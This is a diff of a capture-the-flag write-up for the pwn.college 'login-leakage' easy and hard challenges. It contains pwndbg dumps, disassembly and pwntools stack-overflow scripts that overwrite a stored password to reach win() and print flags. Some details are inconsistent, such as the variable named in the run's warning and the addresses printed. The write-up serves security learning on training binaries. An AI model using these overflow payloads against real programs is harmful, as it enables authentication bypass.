@@ -1178,98 +1178,407 @@ The program's memory status:
 
 Checking Password...
 
-Breakpoint 1, 0x000057752c9ab150 in challenge ()
+Breakpoint 1, 0x000058dbd29d0150 in challenge ()
 LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
-─────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────
- RAX  0x7ffc037530e0 ◂— 'abcdefgh'
- RBX  0x57752c9ab230 (__libc_csu_init) ◂— endbr64 
- RCX  0x7f89c7262297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
- RDX  0x7ffc03753836 ◂— 0xc60d8289afdd2cca
- RDI  0x7ffc037530e0 ◂— 'abcdefgh'
- RSI  0x7ffc03753836 ◂— 0xc60d8289afdd2cca
+─────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────
+ RAX  0x7fff0b3b3010 ◂— 0x6161 /* 'aa' */
+ RBX  0x58dbd29d0230 (__libc_csu_init) ◂— endbr64 
+ RCX  0x7a0266883297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0x7fff0b3b3766 ◂— 0xd7dab6104a159525
+ RDI  0x7fff0b3b3010 ◂— 0x6161 /* 'aa' */
+ RSI  0x7fff0b3b3766 ◂— 0xd7dab6104a159525
  R8   0x15
  R9   0x2f
- R10  0x57752c9ac83a ◂— 0x415700000000000a /* '\n' */
+ R10  0x58dbd29d183a ◂— 0x415700000000000a /* '\n' */
  R11  0x246
- R12  0x57752c9aa200 (_start) ◂— endbr64 
- R13  0x7ffc03754970 ◂— 1
+ R12  0x58dbd29cf200 (_start) ◂— endbr64 
+ R13  0x7fff0b3b48a0 ◂— 1
  R14  0
  R15  0
- RBP  0x7ffc03753850 —▸ 0x7ffc03754880 ◂— 0
- RSP  0x7ffc037530b0 ◂— 0
- RIP  0x57752c9ab150 (challenge+1074) ◂— call strcmp@plt
-──────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
- ► 0x57752c9ab150 <challenge+1074>    call   strcmp@plt                  <strcmp@plt>
-        s1: 0x7ffc037530e0 ◂— 'abcdefgh'
-        s2: 0x7ffc03753836 ◂— 0xc60d8289afdd2cca
+ RBP  0x7fff0b3b3780 —▸ 0x7fff0b3b47b0 ◂— 0
+ RSP  0x7fff0b3b2fe0 ◂— 0
+ RIP  0x58dbd29d0150 (challenge+1074) ◂— call strcmp@plt
+──────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────
+ ► 0x58dbd29d0150 <challenge+1074>    call   strcmp@plt                  <strcmp@plt>
+        s1: 0x7fff0b3b3010 ◂— 0x6161 /* 'aa' */
+        s2: 0x7fff0b3b3766 ◂— 0xd7dab6104a159525
  
-   0x57752c9ab155 <challenge+1079>    test   eax, eax
-   0x57752c9ab157 <challenge+1081>    je     challenge+1105              <challenge+1105>
+   0x58dbd29d0155 <challenge+1079>    test   eax, eax
+   0x58dbd29d0157 <challenge+1081>    je     challenge+1105              <challenge+1105>
  
-   0x57752c9ab159 <challenge+1083>    lea    rdi, [rip + 0x1838]     RDI => 0x57752c9ac998 ◂— 'Password check failed! Exiting!'
-   0x57752c9ab160 <challenge+1090>    call   puts@plt                    <puts@plt>
+   0x58dbd29d0159 <challenge+1083>    lea    rdi, [rip + 0x1838]     RDI => 0x58dbd29d1998 ◂— 'Password check failed! Exiting!'
+   0x58dbd29d0160 <challenge+1090>    call   puts@plt                    <puts@plt>
  
-   0x57752c9ab165 <challenge+1095>    mov    edi, 1                  EDI => 1
-   0x57752c9ab16a <challenge+1100>    call   exit@plt                    <exit@plt>
+   0x58dbd29d0165 <challenge+1095>    mov    edi, 1                  EDI => 1
+   0x58dbd29d016a <challenge+1100>    call   exit@plt                    <exit@plt>
  
-   0x57752c9ab16f <challenge+1105>    lea    rdi, [rip + 0x1842]     RDI => 0x57752c9ac9b8 ◂— 'Password check passed!'
-   0x57752c9ab176 <challenge+1112>    call   puts@plt                    <puts@plt>
+   0x58dbd29d016f <challenge+1105>    lea    rdi, [rip + 0x1842]     RDI => 0x58dbd29d19b8 ◂— 'Password check passed!'
+   0x58dbd29d0176 <challenge+1112>    call   puts@plt                    <puts@plt>
  
-   0x57752c9ab17b <challenge+1117>    mov    eax, 0                  EAX => 0
-   0x57752c9ab180 <challenge+1122>    call   win                         <win>
-───────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────
-00:0000│ rsp     0x7ffc037530b0 ◂— 0
-01:0008│-798     0x7ffc037530b8 —▸ 0x7ffc03754988 —▸ 0x7ffc03756698 ◂— 'SHELL=/run/dojo/bin/bash'
-02:0010│-790     0x7ffc037530c0 —▸ 0x7ffc03754978 —▸ 0x7ffc0375667a ◂— '/challenge/login-leakage-easy'
-03:0018│-788     0x7ffc037530c8 ◂— 0x100000000
-04:0020│-780     0x7ffc037530d0 ◂— 0
-05:0028│-778     0x7ffc037530d8 ◂— 8
-06:0030│ rax rdi 0x7ffc037530e0 ◂— 'abcdefgh'
-07:0038│-768     0x7ffc037530e8 ◂— 0
-─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────
- ► 0   0x57752c9ab150 challenge+1074
-   1   0x57752c9ab21e main+134
-   2   0x7f89c7178083 __libc_start_main+243
-   3   0x57752c9aa22e _start+46
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   0x58dbd29d017b <challenge+1117>    mov    eax, 0                  EAX => 0
+   0x58dbd29d0180 <challenge+1122>    call   win                         <win>
+────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────
+00:0000│ rsp     0x7fff0b3b2fe0 ◂— 0
+01:0008│-798     0x7fff0b3b2fe8 —▸ 0x7fff0b3b48b8 —▸ 0x7fff0b3b6698 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-790     0x7fff0b3b2ff0 —▸ 0x7fff0b3b48a8 —▸ 0x7fff0b3b667a ◂— '/challenge/login-leakage-easy'
+03:0018│-788     0x7fff0b3b2ff8 ◂— 0x100000000
+04:0020│-780     0x7fff0b3b3000 ◂— 0
+05:0028│-778     0x7fff0b3b3008 ◂— 2
+06:0030│ rax rdi 0x7fff0b3b3010 ◂— 0x6161 /* 'aa' */
+07:0038│-768     0x7fff0b3b3018 ◂— 0
+──────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────
+ ► 0   0x58dbd29d0150 challenge+1074
+   1   0x58dbd29d021e main+134
+   2   0x7a0266799083 __libc_start_main+243
+   3   0x58dbd29cf22e _start+46
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
 We can see that the program compares the first bytes of our payload to the saved password. Ideally, it would compare the saved password with some random number.
+
+Let change the value pointed to by `rdi` to be same as the one pointed to by `rsi`.
+
+```
+pwndbg> set *(unsigned long*)$rdi = *(unsigned long*)$rsi
+pwndbg> c
+Continuing.
+Password check passed!
+You win! Here is your flag:
+
+  ERROR: Failed to open the flag -- Permission denied!
+  Your effective user id is not 0!
+  You must directly run the suid binary in order to have the correct permissions!
+[Inferior 1 (process 1362) exited with code 0377]
+```
+
+We can see that the program calls `win()` for us if the values turn out to be the same.
+
+### Exploit
 
 Since, we control the first 8 bytes of our payload that we write into the buffer, and the challenge also tells us the address of the buffer and the stored address, we can easily set both values to the same string.
 
 That way, the check will succeed and the challenge will call `win()` for us.
 
-### Exploit
-
-```py
+```py title="~/script.py showLineNumbers
 from pwn import *
 
 p = process('/challenge/login-leakage-easy')
 
 # Initialize values
-buffer_addr = 0x7fffaef3f4c0
-password_addr = 0x7fffaef3fc16
+buffer_addr = 0x7ffccd0bfbe0
+password_addr = 0x7ffccd0c0336
 addr_of_saved_bp = 0x7ffe2e4a66a0
-password = 0xdeadbeefcafebabe
+password = 0xdeadbeef
 
-# Calculate offset & bytes_to_read
+# Calculate offset & payload_size
 offset = password_addr - buffer_addr
-bytes_to_read = offset + 8
+payload_size = offset + 8
 
 # Build payload
 payload = p64(password)
-payload += b"\00"
-payload += b"A" * (offset - (8 + 1))
+payload += b"A" * (offset - 8)
 payload += p64(password)
 
 # Send number of bytes
 p.recvuntil(b'Payload size: ')
-p.sendline(str(bytes_to_read))
+p.sendline(str(payload_size))
 
 # Send payload
 p.recvuntil(b'Send your payload')
 p.send(payload)
 
 p.interactive() 
+```
+
+```
+hacker@program-security~login-leakage-easy:/$ python ~/script.py 
+[+] Starting local process '/challenge/login-leakage-easy': pid 4616
+/home/hacker/script.py:23: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.sendline(str(bytes_to_read))
+[*] Switching to interactive mode
+ (up to 1886 bytes)!
+You sent 1886 bytes!
+Let's see what happened with the stack:
+
+# --- snip ---
+
+The program's memory status:
+- the input buffer starts at 0x7ffe8b13d3b0
+- the password buffer starts at 0x7ffe8b13db06
+
+Checking Password...
+Password check passed!
+You win! Here is your flag:
+pwn.college{YCCUOqCpOZtJeDomtA34lWAsydW.QXwgzN4EDL4ITM0EzW}
+
+
+Goodbye!
+[*] Got EOF while reading in interactive
+$
+```
+
+&nbsp;
+
+## Login leakage (Hard)
+
+```
+hacker@program-security~login-leakage-hard:/$ /challenge/login-leakage-hard 
+Payload size: 2
+Send your payload (up to 2 bytes)!
+aa
+Password check failed! Exiting!
+```
+
+In this challenge we do not get any information from running the program.
+
+Requirements to craft an exploit:
+
+* [ ] Location of buffer
+* [ ] Location of password
+
+### Disassembly
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000001000  _init
+0x0000000000001100  __cxa_finalize@plt
+0x0000000000001110  __errno_location@plt
+0x0000000000001120  puts@plt
+0x0000000000001130  write@plt
+0x0000000000001140  printf@plt
+0x0000000000001150  geteuid@plt
+0x0000000000001160  close@plt
+0x0000000000001170  read@plt
+0x0000000000001180  strcmp@plt
+0x0000000000001190  setvbuf@plt
+0x00000000000011a0  open@plt
+0x00000000000011b0  __isoc99_scanf@plt
+0x00000000000011c0  exit@plt
+0x00000000000011d0  strerror@plt
+0x00000000000011e0  _start
+0x0000000000001210  deregister_tm_clones
+0x0000000000001240  register_tm_clones
+0x0000000000001280  __do_global_dtors_aux
+0x00000000000012c0  frame_dummy
+0x00000000000012c9  bin_padding
+0x00000000000018b3  win
+0x00000000000019ba  challenge
+0x0000000000001b3c  main
+0x0000000000001bd0  __libc_csu_init
+0x0000000000001c40  __libc_csu_fini
+0x0000000000001c48  _fini
+pwndbg> 
+```
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x00000000000019ba <+0>:     endbr64
+   0x00000000000019be <+4>:     push   rbp
+   0x00000000000019bf <+5>:     mov    rbp,rsp
+   0x00000000000019c2 <+8>:     sub    rsp,0x670
+   0x00000000000019c9 <+15>:    mov    DWORD PTR [rbp-0x654],edi
+   0x00000000000019cf <+21>:    mov    QWORD PTR [rbp-0x660],rsi
+   0x00000000000019d6 <+28>:    mov    QWORD PTR [rbp-0x668],rdx
+   0x00000000000019dd <+35>:    lea    rdx,[rbp-0x640]
+   0x00000000000019e4 <+42>:    mov    eax,0x0
+   0x00000000000019e9 <+47>:    mov    ecx,0xc6
+   0x00000000000019ee <+52>:    mov    rdi,rdx
+   0x00000000000019f1 <+55>:    rep stos QWORD PTR es:[rdi],rax
+   0x00000000000019f4 <+58>:    mov    esi,0x0
+   0x00000000000019f9 <+63>:    lea    rdi,[rip+0x70c]        # 0x210c
+   0x0000000000001a00 <+70>:    mov    eax,0x0
+   0x0000000000001a05 <+75>:    call   0x11a0 <open@plt>
+   0x0000000000001a0a <+80>:    mov    DWORD PTR [rbp-0x4],eax
+   0x0000000000001a0d <+83>:    lea    rax,[rbp-0x640]
+   0x0000000000001a14 <+90>:    lea    rcx,[rax+0x628]
+   0x0000000000001a1b <+97>:    mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000001a1e <+100>:   mov    edx,0x8
+   0x0000000000001a23 <+105>:   mov    rsi,rcx
+   0x0000000000001a26 <+108>:   mov    edi,eax
+   0x0000000000001a28 <+110>:   call   0x1170 <read@plt>
+   0x0000000000001a2d <+115>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000001a30 <+118>:   mov    edi,eax
+   0x0000000000001a32 <+120>:   call   0x1160 <close@plt>
+   0x0000000000001a37 <+125>:   mov    QWORD PTR [rbp-0x648],0x0
+   0x0000000000001a42 <+136>:   lea    rdi,[rip+0x6d0]        # 0x2119
+   0x0000000000001a49 <+143>:   mov    eax,0x0
+   0x0000000000001a4e <+148>:   call   0x1140 <printf@plt>
+   0x0000000000001a53 <+153>:   lea    rax,[rbp-0x648]
+   0x0000000000001a5a <+160>:   mov    rsi,rax
+   0x0000000000001a5d <+163>:   lea    rdi,[rip+0x6c4]        # 0x2128
+   0x0000000000001a64 <+170>:   mov    eax,0x0
+   0x0000000000001a69 <+175>:   call   0x11b0 <__isoc99_scanf@plt>
+   0x0000000000001a6e <+180>:   mov    rax,QWORD PTR [rbp-0x648]
+   0x0000000000001a75 <+187>:   mov    rsi,rax
+   0x0000000000001a78 <+190>:   lea    rdi,[rip+0x6b1]        # 0x2130
+   0x0000000000001a7f <+197>:   mov    eax,0x0
+   0x0000000000001a84 <+202>:   call   0x1140 <printf@plt>
+   0x0000000000001a89 <+207>:   mov    rdx,QWORD PTR [rbp-0x648]
+   0x0000000000001a90 <+214>:   lea    rax,[rbp-0x640]
+   0x0000000000001a97 <+221>:   mov    rsi,rax
+   0x0000000000001a9a <+224>:   mov    edi,0x0
+   0x0000000000001a9f <+229>:   call   0x1170 <read@plt>
+   0x0000000000001aa4 <+234>:   mov    DWORD PTR [rbp-0x8],eax
+   0x0000000000001aa7 <+237>:   cmp    DWORD PTR [rbp-0x8],0x0
+   0x0000000000001aab <+241>:   jns    0x1ad9 <challenge+287>
+   0x0000000000001aad <+243>:   call   0x1110 <__errno_location@plt>
+   0x0000000000001ab2 <+248>:   mov    eax,DWORD PTR [rax]
+   0x0000000000001ab4 <+250>:   mov    edi,eax
+   0x0000000000001ab6 <+252>:   call   0x11d0 <strerror@plt>
+   0x0000000000001abb <+257>:   mov    rsi,rax
+   0x0000000000001abe <+260>:   lea    rdi,[rip+0x693]        # 0x2158
+   0x0000000000001ac5 <+267>:   mov    eax,0x0
+   0x0000000000001aca <+272>:   call   0x1140 <printf@plt>
+   0x0000000000001acf <+277>:   mov    edi,0x1
+   0x0000000000001ad4 <+282>:   call   0x11c0 <exit@plt>
+   0x0000000000001ad9 <+287>:   lea    rax,[rbp-0x640]
+   0x0000000000001ae0 <+294>:   lea    rdx,[rax+0x628]
+   0x0000000000001ae7 <+301>:   lea    rax,[rbp-0x640]
+   0x0000000000001aee <+308>:   mov    rsi,rdx
+   0x0000000000001af1 <+311>:   mov    rdi,rax
+   0x0000000000001af4 <+314>:   call   0x1180 <strcmp@plt>
+   0x0000000000001af9 <+319>:   test   eax,eax
+   0x0000000000001afb <+321>:   je     0x1b13 <challenge+345>
+   0x0000000000001afd <+323>:   lea    rdi,[rip+0x67c]        # 0x2180
+   0x0000000000001b04 <+330>:   call   0x1120 <puts@plt>
+   0x0000000000001b09 <+335>:   mov    edi,0x1
+   0x0000000000001b0e <+340>:   call   0x11c0 <exit@plt>
+   0x0000000000001b13 <+345>:   lea    rdi,[rip+0x686]        # 0x21a0
+   0x0000000000001b1a <+352>:   call   0x1120 <puts@plt>
+   0x0000000000001b1f <+357>:   mov    eax,0x0
+   0x0000000000001b24 <+362>:   call   0x18b3 <win>
+   0x0000000000001b29 <+367>:   lea    rdi,[rip+0x687]        # 0x21b7
+   0x0000000000001b30 <+374>:   call   0x1120 <puts@plt>
+   0x0000000000001b35 <+379>:   mov    eax,0x0
+   0x0000000000001b3a <+384>:   leave
+   0x0000000000001b3b <+385>:   ret
+End of assembler dump.
+```
+
+Let's set a breakpoint at `challenge+314` right before the call to `strcmp@plt` is made.
+
+```
+pwndbg> break *(challenge+314)
+Breakpoint 1 at 0x58d45125faf4
+```
+
+```
+pwndbg> run
+Starting program: /challenge/login-leakage-hard 
+Payload size: 2
+Send your payload (up to 2 bytes)!
+aa
+
+Breakpoint 1, 0x00005ceaa0cb5af4 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7ffd75790bf0 ◂— 0x6161 /* 'aa' */
+ RBX  0x5ceaa0cb5bd0 (__libc_csu_init) ◂— endbr64 
+ RCX  0x7827536e01f2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0x7ffd75791218 ◂— 0x4071f3148c64193a
+ RDI  0x7ffd75790bf0 ◂— 0x6161 /* 'aa' */
+ RSI  0x7ffd75791218 ◂— 0x4071f3148c64193a
+ R8   0x23
+ R9   0x23
+ R10  0x5ceaa0cb614c ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x5ceaa0cb51e0 (_start) ◂— endbr64 
+ R13  0x7ffd75792350 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffd75791230 —▸ 0x7ffd75792260 ◂— 0
+ RSP  0x7ffd75790bc0 ◂— 0
+ RIP  0x5ceaa0cb5af4 (challenge+314) ◂— call strcmp@plt
+──────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x5ceaa0cb5af4 <challenge+314>    call   strcmp@plt                  <strcmp@plt>
+        s1: 0x7ffd75790bf0 ◂— 0x6161 /* 'aa' */
+        s2: 0x7ffd75791218 ◂— 0x4071f3148c64193a
+ 
+   0x5ceaa0cb5af9 <challenge+319>    test   eax, eax
+   0x5ceaa0cb5afb <challenge+321>    je     challenge+345               <challenge+345>
+ 
+   0x5ceaa0cb5afd <challenge+323>    lea    rdi, [rip + 0x67c]     RDI => 0x5ceaa0cb6180 ◂— 'Password check failed! Exiting!'
+   0x5ceaa0cb5b04 <challenge+330>    call   puts@plt                    <puts@plt>
+ 
+   0x5ceaa0cb5b09 <challenge+335>    mov    edi, 1                 EDI => 1
+   0x5ceaa0cb5b0e <challenge+340>    call   exit@plt                    <exit@plt>
+ 
+   0x5ceaa0cb5b13 <challenge+345>    lea    rdi, [rip + 0x686]     RDI => 0x5ceaa0cb61a0 ◂— 'Password check passed!'
+   0x5ceaa0cb5b1a <challenge+352>    call   puts@plt                    <puts@plt>
+ 
+   0x5ceaa0cb5b1f <challenge+357>    mov    eax, 0                 EAX => 0
+   0x5ceaa0cb5b24 <challenge+362>    call   win                         <win>
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp     0x7ffd75790bc0 ◂— 0
+01:0008│-668     0x7ffd75790bc8 —▸ 0x7ffd75792368 —▸ 0x7ffd75793698 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-660     0x7ffd75790bd0 —▸ 0x7ffd75792358 —▸ 0x7ffd7579367a ◂— '/challenge/login-leakage-hard'
+03:0018│-658     0x7ffd75790bd8 ◂— 0x100000000
+04:0020│-650     0x7ffd75790be0 ◂— 0
+05:0028│-648     0x7ffd75790be8 ◂— 2
+06:0030│ rax rdi 0x7ffd75790bf0 ◂— 0x6161 /* 'aa' */
+07:0038│-638     0x7ffd75790bf8 ◂— 0
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5ceaa0cb5af4 challenge+314
+   1   0x5ceaa0cb5bc2 main+134
+   2   0x7827535f6083 __libc_start_main+243
+   3   0x5ceaa0cb520e _start+46
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+* [x] Location of buffer: `0x7ffd75790bf0`
+* [x] Location of password: `0x7ffd75791218`
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process('/challenge/login-leakage-hard')
+
+# Initialize values
+buffer_addr = 0x7ffd75790bf0
+password_addr = 0x7ffd75791218
+# addr_of_saved_bp = 0x7ffe2e4a66a0
+password = 0xdeadbeef
+
+# Calculate offset & payload_size
+offset = password_addr - buffer_addr
+payload_size = offset + 8
+
+# Build payload
+payload = p64(password)
+payload += b"A" * (offset - 8)
+payload += p64(password)
+
+# Send number of bytes
+p.recvuntil(b'Payload size: ')
+p.sendline(str(payload_size))
+
+# Send payload
+p.recvuntil(b'Send your payload')
+p.send(payload)
+
+p.interactive() 
+```
+
+```
+hacker@program-security~login-leakage-hard:~$ python ~/script.py 
+[+] Starting local process '/challenge/login-leakage-hard': pid 475
+/home/hacker/script.py:22: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.sendline(str(payload_size))
+[*] Switching to interactive mode
+ (up to 1584 bytes)!
+[*] Process '/challenge/login-leakage-hard' stopped with exit code 0 (pid 475)
+Password check passed!
+You win! Here is your flag:
+pwn.college{MQmBteRVgsAkLzTDm3hAjp7roKm.QXxgzN4EDL4ITM0EzW}
+
+
+Goodbye!
+[*] Got EOF while reading in interactive
+$  
 ```
